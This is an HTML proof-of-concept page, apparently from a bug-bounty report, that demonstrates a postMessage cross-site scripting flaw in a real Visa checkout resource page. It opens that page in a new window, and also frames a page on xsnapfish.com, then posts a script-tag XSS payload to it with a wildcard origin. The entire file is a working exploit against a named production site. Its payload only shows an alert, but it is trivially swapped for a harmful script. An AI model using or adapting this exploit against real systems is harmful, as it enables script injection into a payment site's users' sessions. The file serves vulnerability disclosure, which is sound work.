<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Postmessage PoC</title>
    <script>
        function pocLink() {
            let win = window.open('https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html');
            let msg = "<script>alert('XSS');</script>";
            
            setTimeout(function(){
                win.postMessage(msg, '*');
            }, 5000);
        }
        function pocFrame(win) {           
            let msg = "<script>alert('XSS');</script>";
            
            win.postMessage(msg, '*');          
        }
    </script>
</head>
<body>
    <a href="#" onclick="pocLink();">PoC link</a>
    <iframe src="https://xsnapfish.com/visa.html" onload="pocFrame(this.contentWindow)"></iframe>
</body>
</html>
